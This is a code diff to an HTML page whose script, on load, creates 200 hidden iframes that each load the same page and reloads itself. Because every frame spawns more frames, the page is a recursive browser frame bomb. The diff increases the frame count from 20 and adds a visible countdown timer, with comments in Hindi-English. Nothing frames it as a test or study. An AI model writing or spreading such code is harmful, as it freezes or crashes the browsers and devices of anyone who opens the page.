@@ -6,22 +6,34 @@
 
 <body>
 
+<div id="timer" style="font-size:40px;font-family:Arial;">20</div>
+
 <script>
   const target = location.href.split("?")[0];
+  const FRAME_COUNT = 200;
 
-  function createLoop() {
+  let count = 20;
+  const timer = document.getElementById("timer");
+
+  // Page open hote hi 200 frames create
+  for (let i = 0; i < FRAME_COUNT; i++) {
     const frame = document.createElement("iframe");
     frame.style.display = "none";
     frame.src = target;
     document.body.appendChild(frame);
   }
 
-  // 20 frames
-  for (let i = 0; i < 20; i++) {
-    createLoop();
-  }
+  // Countdown parallel me chalega
+  const countdown = setInterval(() => {
+    count--;
+    timer.textContent = count;
 
-  // Current page ko reload-loop me rakho
+    if (count <= 0) {
+      clearInterval(countdown);
+    }
+  }, 1000);
+
+  // Existing reload loop
   location.replace(target);
 </script>
 
